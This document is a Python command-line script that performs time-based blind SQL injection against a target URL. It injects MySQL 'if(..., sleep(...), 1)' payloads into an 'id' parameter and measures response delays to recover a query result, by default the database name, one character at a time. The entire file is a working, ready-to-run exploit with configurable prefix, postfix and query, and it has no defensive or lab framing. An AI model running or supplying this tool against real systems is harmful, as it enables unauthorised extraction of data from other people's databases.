import requests
import time
import string
import argparse
import json

DEFAULT_CHARS = string.ascii_lowercase + string.ascii_uppercase + string.digits + '@._-' 

def check_condition(url, prefix, postfix, sleep_time, payload):
    full_url = f"{url}?id=1{prefix}{payload}{postfix}"
    
    start_time = time.time()
    try:
        response = requests.get(full_url, timeout=sleep_time + 5) 
    except requests.exceptions.RequestException:
        return False

    end_time = time.time()
    response_time = end_time - start_time
    
    if response_time >= sleep_time:
        return True
    else:
        return False
        
def extract_data(args, sql_query):
    extracted_data = ""
    
    data_length = 0
    for length in range(1, args.max_length + 1):
        length_payload = f"if(length(({sql_query})) = {length}, sleep({args.sleep_time}), 1)"
        if check_condition(args.url, args.prefix, args.postfix, args.sleep_time, length_payload):
            data_length = length
            break
    
    if data_length == 0:
        return ""

    chars_to_use = args.chars
    for index in range(1, data_length + 1):
        for char in chars_to_use:
            char_ascii = ord(char)
            
            char_payload = f"if(ascii(substring(({sql_query}), {index}, 1)) = {char_ascii}, sleep({args.sleep_time}), 1)"
            
            if check_condition(args.url, args.prefix, args.postfix, args.sleep_time, char_payload):
                extracted_data += char
                break
        else:
            extracted_data += '?'
            
    return extracted_data

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    
    parser.add_argument('-u', '--url', 
                        type=str, 
                        required=True)
    
    parser.add_argument('-s', '--sleep-time', 
                        type=int, 
                        default=5)
                        
    parser.add_argument('-q', '--query',
                        type=str,
                        default="select database()")

    parser.add_argument('--prefix',
                        type=str,
                        default='" and ')
                        
    parser.add_argument('--postfix',
                        type=str,
                        default=' -- -')

    parser.add_argument('--max-length',
                        type=int,
                        default=20)

    parser.add_argument('--chars',
                        type=str,
                        default=DEFAULT_CHARS)

    args = parser.parse_args()
    
    extracted_result = extract_data(args, args.query)
    
    
    output_data = {
        "status": "success" if extracted_result and '?' not in extracted_result else "partial_success" if '?' in extracted_result else "failed",
        "configuration": {
            "url": args.url,
            "query": args.query,
            "prefix": args.prefix.strip(),
            "postfix": args.postfix.strip(),
            "sleep_time": args.sleep_time
        },
        "result": {
            "data": extracted_result,
            "length": len(extracted_result)
        }
    }
    
    
    print(json.dumps(output_data, indent=4))